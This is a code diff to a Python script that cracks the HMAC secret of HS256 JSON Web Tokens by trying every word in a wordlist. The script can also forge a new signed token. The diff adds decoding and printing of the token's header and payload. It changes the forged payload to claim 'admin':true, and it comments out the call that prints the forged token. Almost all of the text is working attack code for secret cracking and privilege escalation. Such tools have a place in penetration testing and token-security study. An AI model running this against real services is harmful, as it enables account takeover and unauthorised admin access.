@@ -1,34 +1,48 @@
 #! /usr/bin/env python3
 
-import hmac, hashlib, base64, re, sys
-#import json
+import hmac, hashlib, base64, sys
 
 # Get wordlist linecount
-linecount = sum(1 for _ in open(sys.argv[2], 'rb'))
+linecount = len(open(sys.argv[2], "rb").readlines())
 
-#Seperate JWT header/payload
+# Separate header/payload/signature
 def jwtParser(jwt=sys.argv[1]):
     jwt_list = jwt.encode().split(b".")
-    msg = jwt_list[0] + b"." + jwt_list[1]
-    valid_sig = jwt_list[2]
-    return msg, valid_sig
+    return jwt_list[0], jwt_list[1], jwt_list[2]
 
-#Check for HS256
+# Decode header/payload
+def jwtInfo():
+    header, payload, sig = jwtParser()
+    while True:
+        try:
+            header = base64.urlsafe_b64decode(header).decode('utf-8')
+            break
+        except:
+            header += b"="
+    while True:
+        try:
+            payload = base64.urlsafe_b64decode(payload).decode('utf-8')
+            break
+        except:
+            payload += b"="
+    return header, payload
+
+# Check for HS256
 def algCheck():
-    decoded = base64.urlsafe_b64decode(jwtParser()[0]).decode('utf-8')
-    if "HS256" in decoded:
+    if "HS256" in jwtInfo()[0]:
         return True
     else:
         return False
 
-#Brute Force JWT key
+# Brute-force JWT key
 def jwtCrack():
     if algCheck() == False:
         print("Only JWTs using HS256 are supported at this time.")
     else:
         with open(sys.argv[2], "rb") as f:
             wordlist = f.readlines()
-        msg, valid_sig = jwtParser()
+        header, payload, valid_sig = jwtParser()
+        msg = header + b"." + payload
         count = 0
         found = False
         for word in wordlist:
@@ -48,12 +62,12 @@ def jwtCrack():
         else:
             return valid_key
 
-#Forge new JWT with discovered key
+# Forge new JWT with discovered key
 def jwtForge(key):
     key = key.encode()
-    h = str('{"typ":"JWT","alg":"HS256"}')                      #Default HS256 JWT Header 
-    p = str('{"iat":90000000,"name":"User1","admin":false}')    #Modify JWT Payload
-    eh = base64.b64encode(h.encode()).rstrip(b"=")              #Url Safe B64 Encode Header / Payload 
+    h = str('{"typ":"JWT","alg":"HS256"}')
+    p = str('{"iat":90000000,"name":"Jason","admin":true}')
+    eh = base64.b64encode(h.encode()).rstrip(b"=")
     ep = base64.b64encode(p.encode()).rstrip(b"=")
     msg = eh + b"." + ep
     hm = hmac.new(key, msg, hashlib.sha256).digest()
@@ -65,12 +79,10 @@ if __name__ == "__main__":
     if len(sys.argv) != 3:
         print("Usage: %s <jwt> <wordlist>" % sys.argv[0])
     else:
-        vkey = jwtCrack()
-        if vkey != False:
-           print(jwtForge(vkey))
-
-
-#HMACSHA256(
-#  base64UrlEncode(header) + "." +
-#  base64UrlEncode(payload),
-#  secret)
+        h, p = jwtInfo()
+        print("Header:\n" + h + "\n\nPayload:\n" + p + "\n")
+        jwtCrack()
+        #vkey = jwtCrack()
+        #if vkey != False:
+        #   print(jwtForge(vkey))
+        
